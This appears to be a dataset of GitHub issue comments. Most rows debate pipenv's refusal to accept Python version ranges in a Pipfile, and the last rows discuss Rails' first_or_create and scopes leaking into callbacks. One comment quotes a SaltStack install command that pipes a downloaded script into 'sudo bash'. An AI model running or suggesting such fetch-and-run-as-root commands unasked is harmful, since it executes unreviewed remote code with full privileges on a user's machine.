- pipenv install --dev
```

then running `pipenv check` results in:

```
$ pipenv check .
Courtesy Notice: Pipenv found itself running within a virtual environment, so it will automatically use that environment, instead of creating its own for any project.
Checking PEP 508 requirements…
Specifier python_version does not match 3.6 (3.7).
Failed!
```

Which is a shame."
5318	@iScrE4m Just remove the `python_version` requirement from Pipfile if your intend is to support multiple Python versions.
5319	@uranusjr how do we tell our package works for python 3.5 and 3.6 but not 3.4 or 2.7 ?
5320	"@gsemet Do you think you can mention it in your `setup.py` to inform your users? 
If you need a strict restriction, you might want to have a check in your code that double check the current version of python.

What do you think?

"
5321	"i don't see the difference with the python_version markers for dependencies. the whole role of this is to ease automatisation, CI/CD, auto test and so; so that we minimize the among of ""what to know"" in the readme. Of course we ""put a few line"" somewhere to inform the user, but i wish we had something like
```
[required]
python_version = "">=3.5""
```
so that it is crystal clear for pipenv and everything that will read the Pipfile that, no, my package won't work in 3.4 or 2.7 and fail with a nice error.

Same for example if my package works in 3.5 and 3.6 but not on the upcoming 3.7 (`python_version>=3.5;<3.7`), we can describe by range so that `pipenv install --dev` automatically discard 3.7, for instance, and install 3.5 or 3.6, depending on the availability on the system"
5322	"This seems like another chance to mention Donald’s wonderful writeup on this:
https://caremad.io/posts/2013/07/setup-vs-requirement/

Donald was describing package dependencies, but the same principle applies for the dependency of *Python* itself. Pipfile (and requiremets.txt, the format it aims to replace) is for *applications* (webapps, bundled client applications, etc.), where you would only support one pinned version at a time. Information about pip-installable *libraries* should go into setup.py (or setup.cfg). In your case, your package seems to be intended to be installed by a non-controlled audience, using a variety of Python versions. This falls into the library category, and related metadata should therefore go into setup.py, not Pipfile.

Also, specifying `required.python_version` in Pipfile also does not really guarentee anything. With the proposed solution, your `pipenv check` calls on Travis CI would work, but there is still nothing preventing someone running a non-supported Python version from installing your package, because *Pip does not read Pipfile*. It reads setup.py and setup.cfg. To achieve your ultimate goal (preventing installation on incompatible versions), you need to put the requirement in setup.py or setup.cfg.

Now, like most packages out there contain both a setup.py and a requirements.txt, there is absolutely no problem have a Pipfile in your package repository, and use it via Pipenv. Pipenv itself does that as well. In that scenario, however, the Pipfile would simply manage the development environment. It does not have anything to say about how your package would be installed, and should not be used for that. Specify those in setup.py or setup.cfg instead."
5323	Does pipenv consider the Python version from setup.py or setup.cfg when using pyenv to manage the dev environment? My use case was wanting to specify the version for pipenv to install using pyenv for dev without also breaking usage when not using pyenv (and using the system Python instead).
5324	"I do not completely agree with this article. I actually use PBR to abstract this setup.py-ish complexity and works great for both libraries and applications (it is widely used on many OpenStack projects). Hardcoding stuff in setup.py should be considered as bad practices. It is hard to parse, external services (such as readthedocs,...) cannot easily access to this information,... So if setup.py can be as simple as possible for maintainability sake, i'll be happy.

requirements.txt is a great improvement over hardcoded setup.py (even find_packages is hard). It allowed external tools to work with the package, and so much confort in edition.

My point is: **Libraries** ship with `requirements.txt` describing **compatibility versions by range**, **applications** ship with `requirements.txt` **freezing all versions**. I used a lot pip-tools to maintain `requirements.txt.in`, and Pipfile/pipenv makes life much easier now: libraries does not track `Pipfile.lock`, applications does. Work done. But for the moment all application does not support `Pipfile*` (first of all: PBR itself), so I keep requirements.txt synchronized (with version not frozen for libraries, and with version frozen for applications).
So for the dependencies part, the job is pretty much done without having to do kung-foo in `setup.py`.

Pipfile/pipenv is the future of python, and that is greatly expected!

Just for the interpreter itself, sadly, there are limitation: this file can say ""it works for Python 3.5"", but there is no way in `Pipfile` to tell ""this pipfile works for python 3.5 **or** 3.6"", for example. 

**TL;DR: Just a ""or"". We only would like to have a simple ""or"" syntax for python interpreter**
It is a small improvement that would help a lot."
5325	"In short this is handled by setuptools and it seems odd to call the packaging standard a bad practice but you should raise that issue there. We don’t parse `setup.py` or `setup.cfg` but instead simply allow pip’s internals to do so. 

Setup files are for installing a package. As an end user if I want to install a thing you made, your setup file tells my package manager (setuptools) where to put scripts and what dependencies I need. Requirements files don’t do anything besides list dependencies, so relying on one for distributing your software doesn’t make a ton of sense. Whatever abstraction you choose for handling these things, this will still be the case. "
5326	"I'm just starting to use Pipenv and run into this ""issue"".

I am developing Cookiecutter template which makes use of F-Strings, hence it requires python > 3.6, but there is no way for me to specify that on Pipfile.

I do not want to force a version, just need to specify a minimum requirement, and can't do it in a setup.py file, because this is not meant to be installed, pipenv is to be run within the folder of the project.

When I ""pipenv install"" I need to remember to use ""pipenv --python 3.6 install"", and I don't see that as intuitive for anyone else that uses the project.

I think it would be incredibly helpful to be able to declare python compatible versions, and I would greatly appreciate if it gets implemented.

😄 "
5327	"@jmfederico you can absolutely specify this in the Pipfile, that's precisely the origin of this issue. Using the existing syntax you can precisely specify that your pipenv environment is going to be installed using python 3.6 by putting the following section in your pipfile:

```ini
[requires]
python_version = ""3.6""
```

This ensures that when you run `pipenv install` it will use python 3.6. The issue you are commenting on is a request to support specifying multiple python versions in that section"
5328	"But what I want is it to be minimum 3.6, but if the user does not have 3.6 but 3.7, it should use 3.7.

Right now it gets fixed to any 3.6.x ve version and nothing else. No way to say >3.6."
5329	"@jmfederico I don't know much about cookiecutter but I would imagine you can put in your code, which will be executed somewhere, either some kind of fallback or throw an exception if the user attempts to use it in a non-python3.6 environment. If you are distributing your environment itself then currently the expectation is you are using a specific version of python with it, but pipenv wasn't designed as a package distribution tool which is why this feature wasn't built in

Not saying it won't ever be included, but dependency resolution for multiple minor python versions at once in the same lockfile might not even be possible"
5330	"I could throw an exception if python <3.6 (in my case) is used, but it just makes it cumbersome for the user. If the user has a compatible python version installed, it would be better for him/her if pipenv used it.

I do think that this is something that will happen with more than a fair share of projects, and handling it directly within pipenv would avoid repetition. It could be the same as when one specifies a given version, and pipenv complains that it can’t find the version that is being requested, just that it would say that it can’t find any compatible version.

It would move the exception handling up the tool chain.

For now local exception it is, but, as I said, would be awesome (at least for me) if it was handled by pipenv."
5331	@jmfederico I can't speak for other maintainers but the more I hear arguments in favor of a universal tool for handling all packaging related operations in python, the more I am nudged in that direction. These kinds of things feel out of scope while the resolver still has issues but I can see a good argument for supporting these kinds of things in the future
5332	"@techalchemy thanks for your comments.

Would it be possible to reopen the issue, even if just to keep the dialog open?

I think it can help so that others can post suggestions or possible workarounds in the meantime.

:+1

BTW, great tool, really changed the way I work.
Thanks"
5333	"The PEP 508 Markers are meant to provide ""pinned"" constraints, much like a lockfile does. "
5334	"[Markers](https://www.python.org/dev/peps/pep-0508/#id23) explicitely allow using comparison operators.

Please see this request as an expression of a real need from us, python lovers and also package maintainers, on this evolution of the syntax on Pipfile `[required]` section, enabling us better description of our package.
Of course there is the possibility to add safeguards code in the package itself to fails on compatibility issue, but as we got toward standardization of the Pipfile/Pipfile.lock, it would be good at least to study this request.
I have opened the ticket [pipfile#94](https://github.com/pypa/pipfile/issues/94) to integrate this evolution in the pipfile recommendation, but do not see any traction from users. Maybe speaking in this ticket is not adapted and should focus our request on the [pipfile](https://github.com/pypa/pipfile/) project"
5335	"From PEP 508:
> The job of a dependency is to enable tools like pip [1] to find the right package to install. Sometimes this is very loose - just specifying a name, and sometimes very specific - referring to a specific file to install. Sometimes dependencies are only relevant in one platform, or only some versions are acceptable, so the language permits describing all these cases.

Given that the grammar explicitly includes multi-version and version comparison, I would go so far as to say Pipenv _does not_ support PEP 508 for Python version specification. Perhaps there should be a change to the documentation to avoid confusion with regard to this issue?

@gsemet [pipfile#94](https://github.com/pypa/pipfile/issues/94) appears to be a duplicate of [pipfile#87](https://github.com/pypa/pipfile/issues/87), in which @nateprewitt mentions that this is specifically a Pipenv functionality issue, although he also mentions he's open to a PR for clearer documentation (for pipfile)."
5336	"@isobit, to be clear here, python_version and python_full_version in the `required` section are constructs of Pipfile and not related to PEP 508. It seems this discussion conflated the two somewhere along the way. We are intending to support markers for *packages* in the Pipfile. 

Our current support for the version variable in `required` is only for a single version, as per Kenneth’s request. We are still open to documentation around this, but it’s a current constraint of Kenneth’s design goals for the project."
5337	To follow up on @nateprewitt a bit I just want to restate that this is currently treated as an installation instruction for which specific python version to use when generating a virtualenv.  That's why it was added to the spec in the first place -- and I want to also reiterate that we aren't in a position to generate a set of dependency resolutions that work across multiple _environment_ python versions given the current tool design
5338	"@nateprewitt That makes sense given the behavior, however, the documentation says repeatedly that PEP 508 markers are fully supported by the `requires` section (not that they are unrelated constructs). It seems to me the discrepancy between what Pipfile purports (that PEP 508 is supported) and what Pipenv actually implements is what is causing the confusion regarding these issues. The [README](https://github.com/pypa/pipfile#pep-508-support) even links to [this part of PEP 508](https://www.python.org/dev/peps/pep-0508/#environment-markers) which has an example showing how to specify a maximum version.

Sounds like Pipenv's implementation is as it was intended to be, so should we take the discussion over to Pipfile to fix the documentation/spec?

Edit:
I'd like to note that the Pipenv doc that @antoine-de was referencing should also be corrected."
5339	"Thanks for the amazing `pipenv`, its was much needed in the Python tooling space.

This request is extremely obvious.  I am not even sure there was ever a version of `npm`/`node` that didn't allow for this sort of comparisons."
5340	"@zzolo an idempotent environment isn’t possible if you specify an open ended marker as a python version. Say I simply specify `>=2.7` — now I have guaranteed that my pipfile is not useful for reproducible environments because you might have python 3.6 or even python 4, where there is no guarantee. Consider that node is not a great comparison when the release cycle is much shorter. Node was first released in 2009 and is on version 10, while python was released in 1990 and is on version 3.6. 

There are a number of reasons why this doesn’t really make sense for us, and unfortunately this is one of the cases where just because node does it doesn’t mean we should "
5341	"Hi. Sorry to intervein again.

Idempotence is not guaranteed by the Pipfile. It is not its role.
It is the lock file that guarantee the reproductibility of the built.

Nothing prevent having a Pipfile saying this package should run on python >=2.7 and having the lock freeze the exact interpreter version, exactly like the Pipfile might not freeze the version dependencies (for ex: request=« * »), but the lock file does.

It is the responsibility of the developer to maintain its own package. Ultimately the source of truth is the lock file. The Pipfile is just a convenient way of maintaining this lock file. And today specifying the compatibility range of my package against the interpreter version is not possible within the Pipfile, while it should be so simple to use the same syntax that Pipfile support for defining dependency compatibility range.

So for myself I carry a Makefile that does this but I think this makes sense to have it handled nicely by pipenv.

This discussion is weird where several people would like to see an option available and the pipenv maintainers responding negatively. At least a « we think it is not worth it, but feel free to open a pull request »."
5342	"@gsemet, I understand what you're saying, but you have a collaborator tag and you speak for the project, and you're saying things that do not reflect the views of the project.

I understand what is being requested just fine, and I understand that people have asked for it.  I am not sure what I've said that has conveyed that we are open to a pull request on this -- we aren't.  This is a design decision.

> Idempotence is not guaranteed by the Pipfile. It is not its role.
> It is the lock file that guarantee the reproductibility of the built.

Yes, and we can't even generate a reproducible environment if we can't even agree on the major python version involved.  If a pipfile might install python 2.7, funcsigs, and 27 other things, or it might install 4 packages on python 3.7, then you aren't dealing with a reproducible environment.  This is not what pipenv is designed to achieve, and accommodating this has serious technical and resolution-level constraints.  I understand that it would be a nice thing to have.  I think everyone can agree on that.  We are not open to supporting it at this time."
5343	"I use marker for that (ex: install typing for python <3.5), and it is already supported by pipenv.
What you mean is that we would need one Pipfile.lock per environment, since in the current state a lock file is for only one environment. But once the lock file is generated, the environment is quite reproductible (not fully, see bellow).

Lock file are for application and we expect application environment to be fully reproductible on a given environment. So having an interpreter version and all the pypi packages frozen in the lock file makes sense.
For libraries, I think we can all agree there is now way to achieve build reproductibility. I wonder if using Pipfile.lock for library build only (and frozen version should not reflect on install_requires, somehow) could be good, I have sometime variation between the resolution on my machine and on the Travis builds that is not easy to understand.

I would also love to be able to generate several lock files (ex: Pipfile.lock.2.7, Pipfile.lock.2,5 and Pipfile.lock.3.5), to accommodate to the deployment environment (not sure if that is enough, some packages such as numpy would be machine architecture dependent).

I start freezing the version of pip and pipenv in my sidecar makefile in my applications (i heavily use docker) because recent updates of pip and pipenv broke the build, and since we use lockfile to prevent unwanted update on pypi to broke a previously valid build, it is not acceptable to have pipenv broke a fuly working environment on a update.

And that’s ok for pipenv and pip to evolve and sometime break compatibility. And bugs happen, that’s life.
What is currently missing to pip/pipenv ecosystem is a resistance feature, since it is primarily install on the system and not the virtualenv.

Maybe we might want to have several version of pipenv side by side in the user/system environment so that the Pipfile can lock the pipenv/pip version has well. It might be complex to do but in the current state the builds on python using pip and pipenv aren’t reproductible enough even with the lock file. That maybe subject to another thread."
5344	I still don't understand the maintainers' point of view. @techalchemy points out that pipenv is not a package distribution tool and user should use specific Python version. But pipenv does not give us real control over Python version, we can only chose one of Pythons provided by the OS distribution (or installed/compiled manually). It's not like `rustup` utility which allows you to download and install specific version of Rust to get a reproducible environment. So we need at least some flexibility from the tool that positions itself as an easy method to set up a working environment. By using markers in  `requirements.txt`, I can, for example, have a single dependency list in my project that allows me to get a working environment under Python 2.7, 3.5+,  and PyPy 6.0, and even switch between these environments. It's weird that I can't do this with a Pipfile. And all the flexibility that we have in specifying package versions is of no use if we are allowed to use just one version of interpreter. I like the idea to use a single Pipfile for a flexible dependency list and several lock files for reproducible environments.
5345	"Warning: Your Pipfile requires python_version >=3.6, but you are using 3.6.4 (/Users/abc/.local/share/v/t/bin/python).
  $ pipenv check will surely fail.
What is the reason of this warning?"
5346	"@ankitbhatia8993 it seems the reason is because the developers are not interested in other people's problems, and in their experience Python applications never get distributed outside of your own controlled environment.

Must be too much to ask for them to explain more than ""no"" ( https://github.com/pypa/pipenv/issues/1050#issuecomment-346203646 ) during a period of a year to something that seems quite obvious to most people, but in another issue someone seems to spout nonsense about how it's best practice to support only one minor version of Python in an ""application context"" (while most people are perfectly fine saying their code runs on Python `>=3.5` and then know to code against Python 3.5).

https://github.com/pypa/pipenv/issues/2683#issuecomment-409330037

Right now your only solution is to remove the related section from your `Pipfile`."
5347	@ankitbhatia8993 that seems like a bug, possibly. 
5348	@lietu please drop the attitude. Pipenv is for application deployments, not libraries.
5349	"@kennethreitz Who said anything about libraries? Since when is it not allowed to distribute applications with support for multiple Python versions?

Is support for `>=3.5` going to kill you or make Pipenv somehow worse? I doubt it. There is an attitude problem involved with this, and it's yours.

Write an APPLICATION using e.g. various tools such as Kivy, Django, Qt, and you will find that your application tends to support a wide range of Python versions, and you don't always need to ship your own.

Most obviously this problem applies to web applications. You build your application happily on Python 3.6.3, and lo and behold Python 3.6.4 comes out on your server's distro's repos and your application breaks because you have to specify the exact version of Python you support.

You as the developer probably didn't care at all. Mostly thought ""oh nice"" if you read it has some security fixes. And instead your builds are now failing.

Right now your available options to avoid this issue are:

1) Bump into this issue, decide Pipenv is shit and use something else
2) Bump into this issue, realize you can remove that section (which is btw added there by default), and be left without the protection it can also provide you with - e.g. in case a dev tries to run things without realizing their system is only running Python 2.7
3) Write some sort of extra things around Pipenv to make Pipenv behave the way you want it to work for your environment, and every other environment you ever plan to distribute your application into

APPLICATIONS get distributed as well, and are affected by other things in the world. They don't just stay in your perfectly controlled secret vault deep in a cave somewhere.

Just give one good reason to not support it, ""my applications never leave my controlled environment"" is not one."
5350	"Some additional thoughts:

The 3.6.3 -> 3.6.4 upgrade was hastily written and probably wrong, either way applies to 3.5 -> 3.6 upgrade and it doesn't need to.

When I write e.g. open source applications I expect that someone is going to run it on Windows, someone on macOS, someone on Ubuntu, and someone on CentOS, then where easily possible I try to accommodate.

This typically means that I would probably write a version requirement spec similar to `>=2.7,<3.0|>=3.3,<4.0`, and then e.g. use Travis-CI and/or tox to check that it actually works with all of the versions I advertise. Why I can't simply do this, is incomprehensible to me.

I also don't understand the reasoning to limit your view of appropriate uses of Pipenv to just applications, and not libraries. Why build such artificial limitations on what your tool can support? You could just let the users decide what they find the tool useful for, and if there's e.g. issues preventing use with libraries put them in the issue tracker.

I can fully understand the attitude ""This doesn't affect me, so *I'm* not going to fix it."", but I cannot comprehend the attitude ""This doesn't affect me, so I'm going to close the issue and no-one will get a fix ever."""
5351	"Unfortunately the decision wasn’t made based on whether it impacts one single maintainer. The design decisions about Pipfile specifications are based on the intent of the project. You say that when writing applications you like to specify a wide range of versions and platforms. That tells me you didn’t understand the explanation I offered earlier— covering a range of python versions and platforms is precisely the behavior of a library, and identifies the boundary we keep pushing here. 

This constraint is applied for _applications_ which are things you deploy. The point of an application is that you deploy using the precise environment you developed it with. Once you start _distributing_ your software you are now discussing a library which is the thing we are telling you to use `setup.py` or `setup.cfg` for. The simple answer to your question is this: lockfiles are for idempotent environments. Idempotent environments are simply not possible when you start crossing python versions and platforms. Therefore it is not supported by pipenv to generate lockfiles this way.  "
5352	"I should add this: just because we didn’t articulate something in this specific issue doesn’t mean we didn’t articulate it or we made some arbitrary decision because we feel like it. Please don’t come to the issue tracker with a negative attitude and attempt to point fingers and place blame and accuse us of not caring and being selfish. We spend a lot of time supporting this project, mostly on things none of us personally use, and none of us is paid for that time. We are very invested in making good decisions about pipenv and we think carefully about which things to support and why, and often there are things we attempted to support and found we couldn’t due to technical limitations. 

Basically, just because you can’t understand something doesn’t mean there wasn’t a good reason, so to come to our issue tracker and accuse us of doing it out of apathy or malice is a clear indicator that you aren’t here for productive discussion. If you do want to talk productively, feel free to open a new issue describing the feature or bug you’d like to talk about. I get your frustration that things are not how you would like for them to be. Consider that you are not the only person who has ever looked at this and wondered if it were possible, though. If you think you can make an idempotent, fully reproducible, platform and python version independent lockfile, we would absolutely review that PR"
5353	"> The point of an application is that you deploy using the precise environment you developed it with. 
> Once you start distributing your software you are now discussing a library

First time I've heard that to be the definition of an application or a library. I'd go as far as to say it simply sounds like you're wrong about that.

I think [Ansible](https://github.com/ansible/ansible), [Salt Stack](https://github.com/saltstack/salt), and e.g. [GateOne](https://github.com/liftoff/GateOne) are *applications*, that need to work with a number of different Python versions due to being *deployed* to various *different environments*.

Some applications do bundle their own full environments with them, others don't. Both are perfectly valid options.

> Therefore it is not supported by pipenv to generate lockfiles this way.

Who said anything about lockfiles?

It's simple a matter of `Pipfile` supporting the PEP 508 syntax for defining the required Python version. Generally most libraries already support a wide range of Python versions so you can just have the exact same dependencies regardless of if you are running Python 3.5 or 3.6.

> Please don’t come to the issue tracker with a negative attitude and attempt to point fingers and place blame and accuse us of not caring and being selfish.

It was high time someone mentioned that saying ""no"" and closing the issue is not an appropriate thing to do.

> Basically, just because you can’t understand something doesn’t mean there wasn’t a good reason, so to come to our issue tracker and accuse us of doing it out of apathy or malice is a clear indicator that you aren’t here for productive discussion

I'm clearly trying to argue the case for this feature request being discussed here. It seems you are simply trying to claim that you are right and everyone else is wrong, case closed, no need for further elaboration. Which one of us is against productive discussion, really?

The amount of times this seems to have popped up as a thing people think should obviously be supported tells something.

If you were to add the support for PEP 508 syntax, what would change for you?

You could still use e.g. `>=3.6,<3.7` for locking it to `3.6.x` and get what you wanted. On top of that, everyone else would be happy too."
5354	"This is both a technical constraint and a design decision.  You can claim that 'supporting pep 508 syntax' would be simple, but that is not right. I have already explained why. No amount of claiming that people support it will solve this issue which I have described several times.  This is not a matter of convincing anyone this is a good idea.

> I think Ansible, Salt Stack, and e.g. GateOne are applications, that need to work with a number of different Python versions due to being deployed to various different environments.

Do you `pip install` it?  It's packaged as a library.  Let me point you at [this article](https://caremad.io/posts/2013/07/setup-vs-requirement/) about the distinction which is referenced throughout the issue tracker and which describes why libraries are specifically the things you put on PyPI.

> It seems you are simply trying to claim that you are right and everyone else is wrong, case closed, no need for further elaboration. Which one of us is against productive discussion, really?

I am attempting to have a productive discussion, but you are simply restating that it is a 'simple matter' of supporting pep 508 syntax, which means you didn't actually read my response explaining why it is not at all simple.

> Who said anything about lockfiles?

Considering that the entire function of pipenv is to create idempotent environments, the state of which is represented in a `Pipfile.lock`, the impact of any design decision on lockfiles seems pretty critical.  If that is not clear then you need to spend some time learning about pipenv before demanding features and attempting to explain how simple their implementation would be.  Again, if you have a working implementation, I'd be glad to review your PR.  Thanks for your feedback."
5355	"> You can claim that 'supporting pep 508 syntax' would be simple

What I meant is that the task simply means supporting PEP 508 instead of whatever else you seemed to try to bring in for seemingly no reason, and did not imply it's necessarily easy to do.

You also don't close issues because they're hard to solve, you close them because they're resolved or invalid. If it's a hard problem, you leave the issue open, and if you're feeling kind you also leave it with an explanation on why it's hard, maybe a link to the relevant source with a message saying ""if anyone feels daring enough to give it a try"" or similar.

Also having an issue open does not mean someone is expecting you to work on it immediately, just that it's been acknowledged as a problem that someone can work on in the future. If you're scared it does, GitHub has tags to say e.g. `Low Priority` or `Problematic` etc.

> Do you pip install it?

No.

E.g.:
```bash
curl -L https://bootstrap.saltstack.com | sudo bash -s -- git develop
```

Basically what that does on CentOS is described at https://github.com/saltstack/salt-bootstrap/blob/develop/bootstrap-salt.sh#L3608-L3983 .. lots of things, but none of them is `pip install salt`.

There are lots of OSS things out there that run on a wide variety of Python versions, and you install with `git clone`, or by downloading a `.tar.gz` and then run, without any `pip install <application>` involved. Hey here's even something I wrote back in the days that is an application, had Travis tests for multiple Python versions, and is not published on PyPI: [https://github.com/lietu/twitch-bot](https://github.com/lietu/twitch-bot)

I do comprehend the difference between things you publish to PyPI and things you install as applications. For one you typically want `setup.py`, and for the other you can do whatever you want. Considering what kind of a mess `setup.py` tends to be, it wouldn't be a terrible idea to see a tool such as Pipenv to provide an alternative to that in the future.

> the impact of any design decision on lockfiles seems pretty critical

I see one mention of this version in the `Pipfile.lock`: `._meta.requires.python_version`. Hey I could be wrong, but with my relatively layman's point of view (in terms of this codebase) it doesn't seem like it means a massive change for the lockfile.

> Again, if you have a working implementation, I'd be glad to review your PR.

Sure doesn't look like it, and will not look like it to anyone, since the issue is closed. *THIS* is the whole point.

The issue was closed with the message ""no"". That indicates to everyone who comes to this page (quite a few people from the looks of it) that the team simply doesn't care.

Anyway, at this point I've done all I can to hammer in the point. If you still don't get it/care, there is no point to me wasting my time on this, as I'm also not paid to do this and there's also a limited amount of things I'm willing to do for free."
5356	"I have to say I am really confused.

Please correct me if I am wrong:

- The whole point of a lock file is to provide a reproducible environment,
- but Pipfile is not yet a lock file,
- Pipfile.lock IS the lock file,
- Pipfile allows me to set a base point of requirements from which I can then create a Pipfile.lock which I can then commit so that I know what environment my app is running against, and doing it so reliably, which I can then reproduce.
- How is allowing a relaxed version requirement for python in Pipfile affecting Pipfile.lock?
- Seems like it is exactly the same as allowing a relaxed requirement for any other package."
5357	"I've been taking a break from pipenv, but this seems like a super non-contriversal issue to jump back into...  I will try and add a few things.

If you want your package to support multiple python versions, put it in your setup.py and let it be installed by the user.  That's were it belongs; in setup.py.  Pipfile/Pipfile.lock/pipenv are not meant to replace a setup.py or a setup.cfg.  It is a replacement for requirements files only.  To my knowledge requirements.txt doesn't even allow you to specify a minimum python version for the project only per a requirement according to pep508.  If you are distributing your project to other people for them to use as a library, write a setup.py.  If you distributing your project to other people for them to run as an application, use Pipfile and pipenv.  Bonus points if you have pyenv installed as pipenv will try and download the version of python specified in the Pipfile so it works exactly as it did on the creators machine.  "
5358	There are some great packages that help aid in packaging like https://github.com/takluyver/flit.  They use `pyproject.toml` which is intended to replace the setup.py.  Pipenv doesn't try and do this, it's just virtualenv and dependency management tool, could be called a packaging tool for applications, but not libraries.
5359	"Also we close issues because this is the issue tracker where we decide what is going to be incorporated into code or not. This is not planned as a feature, not a bug, etc. it is a conscious choice to not pursue it, not simply ‘because it is hard’, but because we chose not to pursue it. 

Beyond that we can actually close issues for a variety of reasons besides merging code that addresses them, but you can start your own project and handle issues on that project any way you choose. 

To put a finer point on it: we have thought about the implications of this decision. We have no plans to change it. Thanks for understanding. "
5360	"Hey @brocktimus and thanks for your report. I'm not sure if this is actually a bug. This problem was reported before and you can follow the discussion here #7853 and here #7391. Those tickets were closed because it was the expected behavior.

/cc @jonleighton 
"
5361	"Right if its working as intended thats fine. 

In Rails 3 I would have used find_or_create_by_full_name(full_name). 

I'm just playing with rails 4 a bit and most of the transition documentation said to change that to the where(hash).first_or_create_by. I didn't realise the existence of .find_or_create(hash) until looking into the ActiveRecord code to investigate.

Did you want me to document how those methods work anywhere or how things should be changed for compatibilty? Unsure exactly how railsguides and the like work and what happens during changeover between major releases.
"
5362	"If we settle that this is the expected behavior It totally makes sense to document it. The fact that already 3 reports were filed regarding the same problem shows that it's not as ""expected"" as it could be which makes documentation even more necessary.

In my opinion the guides should explain how to get a 3.x app running on 4.0 without such complications. I think it would be good to promote `#find_or_create`. As the described scenario is a combination of different methods on relation it's kind of hard to put it into the rdocs. Methods that always run into this behavior like `first_or_create` could be a good place though.

@rafaelfranca @steveklabnik thoughts?
"
5363	"Is `find_or_create` available in 3.2? I've been migrating across to the `where(hash).first_or_create` recently in my 3.2 apps because it was available and was the way rails seemed to be moving forward.

Just figured I'd add my 2c regarding how it looks.

I did think the `first_or_create` syntax was really nice before this, especially being able to pass in a block for extra parameters. It looked a lot nicer than the original `find_or_create_by_column_name` methods since you construct it like any other relation and then tack on `first_or_create` to the end. 

It was the guides like that below and some others which suggested this as a drop in replacement.

http://blog.remarkablelabs.com/2012/12/what-s-new-in-active-record-rails-4-countdown-to-2013

The idea of just doing `.new.save` as a work around seems awkward and I would've expected to be equivalent to `create`. I guess it ends up being a question of how often is this desired functionality, how often will it trip people up and how complex is it to ""fix"" right?
"
5364	"Yeah, I think we should promote `find_or_create` since its behavior is closer to the dynamic finders.
"
5365	"Jon implemented find_or_create_by on relation, so let's just document that.
"
5366	"I agree. I kinda consider `first_or_create` and friends to be soft-deprecated, so we should definitely promote `find_or_create` and friends in the docs.
"
5367	"Want me to write something up to that effect in the Rails 4 release notes + upgrading ruby on rails guides?
"
5368	"@brocktimus if you want, please
"
5369	"I'm confused.

Rails 4 Release Notes says this (http://edgeguides.rubyonrails.org/4_0_release_notes.html):

```
find_or_create_by_... can be rewritten using find_or_create_by(...) or where(...).first_or_create.
```

Is this incorrect now? Considering that `first_or_create` is soft-deprecated?
"
5370	"Let's say I had this:

```
Model.where(a: 1, b: 1).first_or_create(c: 1)
```

How can I reproduce this behaviour with new methods?

It's sad, `first_or_create` was really useful.
"
5371	"I've updated docrails to try and reflect that the first_or_\* methods shouldn't be used as drop in replacements for the others. I don't know if there are similar issues with first_or_initialize, but I'm guessing there could be if you did specific things in an after_initialize block.

https://github.com/brocktimus/docrails/commit/56297d0c8e9925e3e57699ac2a95028b72a64030

Are the changes to magical finders a big enough change to be mentioned in the upgrading_ruby_on_rails guide? Currently there is no mention of them.

I can't comment on the soft deprecation status, but can comment on that code. As it stands it would work, but would be very dependent on any callbacks in your model as the scope of the where will effect them as well.

If you didn't want to use them to prevent potential issues later you could rewrite it in one of the following ways:

``` ruby
Model.where(a: 1, b: 1).first_or_initialize(c: 1).save

creating = Model.find_or_initialize_by(a: 1, b: 1)
creating.c = 1 if creating.new_record?
creating.save
```

I liked it the first_or_\* methods, but if they're too complicated or difficult to maintain I'm not overly attached to them.
"
5372	"@brocktimus Thank you, that was very helpful! :thumbsup: 
"
5373	"Is this still a bug now after changes to http://edgeguides.rubyonrails.org/4_0_release_notes.html ?
"
5374	"@vipulnsward 

> Are the changes to magical finders a big enough change to be mentioned in the upgrading_ruby_on_rails guide? Currently there is no mention of them.

I agree that we should mention it in the upgrading guide. Then I think that we can close it.
"
5375	"Since @jonleighton said the first_or_\* methods are soft deprecated should we only mention the drop in replacements of find_or_*_by() ?
"
5376	"I've done that already in https://github.com/brocktimus/docrails/commit/56297d0c8e9925e3e57699ac2a95028b72a64030 should I just merge that onto master of docrails?
"
5377	"@brocktimus I have added https://github.com/rails/rails/pull/12015 based on your changes.
You can merge your changes after that gets reviewed.
"
5378	"I don't understand how this issue has been closed. The first report didn't include any `*_by*` methods as does not my issue #12305. How come they're related or is the documentation still not sufficiently written?

Documentation only writes about those dynamic methods, but not telling anything that this code should not work as it did before:
`Foo.where(name: ""bar"").create` or `Foo.where(name: ""bar"").first_or_create(baz: ""bar"")`.

Are you trying to say with the documentation change which led of closing these issues, that the code above should also not work and it is expected behavior of changing the default scope of the class itself (not even singleton class)?
"
5379	"For reference I'm posting the example from #12305 : 

``` ruby
class Testing < ActiveRecord::Base
  scope :mine, -> { where(field: ""mine"") }

  after_create do
    Testing.where(field: ""other"").load
  end
end
```

```
irb(main):005:0> Testing.mine.create
   (1.0ms)  begin transaction
  SQL (0.0ms)  INSERT INTO ""testings"" (""created_at"", ""field"", ""updated_at"") VALUES (?, ?, ?)  [[""created_at"", Fri, 20 Sep 2013 15:56:33 UTC +00:00], [""field"", ""mine""], [""updated_at"", Fri, 20 Sep 2013 15:56:33 UTC +00:00]]
  Testing Load (0.0ms)  SELECT ""testings"".* FROM ""testings"" WHERE ""testings"".""field"" = 'mine' AND ""testings"".""field"" = 'other'
   (12.0ms)  commit transaction
=> #<Testing id: 2, field: ""mine"", created_at: ""2013-09-20 15:56:33"", updated_at: ""2013-09-20 15:56:33"">
```

I'll reopen as we did not change documentation for `#create` in combination with scopes.
"
5380	"As mentioned above, i don't think that the problem is only not being mentioned in the documentation, but the problem is that the class's scope itself is changed, which should not ever happen (unless specified explicitly with default scope, if i'm not mistaken).
"
5381	"I dug around myself before creating this ticket. I was using first or create and found that it was calling first and then ORing the result with create. Thus the problem (as I saw it) was within the create method, so thats how I raised the issue.

The reason this was an issue for me (and others) was because first_or_create was the recommended upgrade path from find_or_create_by_\* methods in rails 3. This had different behaviour to the original find_or_create_by_\* methods so instead I changed documentation to point at the newer find_or_create_by(hash) methods which had the same expected behaviour.

I've got no idea if / when the behaviour of MyModel.query_scope.create was changed. Did it behave differently in previous versions of rails or is the comment more that it is unintuitive?
"
5382	"The example code i wrote in issue #12305 worked fine with ActiveRecord 3.x series. The problem arised when i upgraded to 4.0.
"
5383	"It seems like the problem is that the lifecycle hooks/callbacks are being evaluated within a scope. What if we were to make all off these hooks be performed without an enclosing scope? That is, when would we need/want them to be performed inside a scope?
"
5384	"This issue has been automatically marked as stale because it has not been commented on for at least
three months.

The resources of the Rails team are limited, and so we are asking for your help.

If you can still reproduce this error on the `4-1-stable`, `4-0-stable` branches or on `master`,
please reply with all of the information you have about it in order to keep the issue open.

Thank you for all your contributions.
"
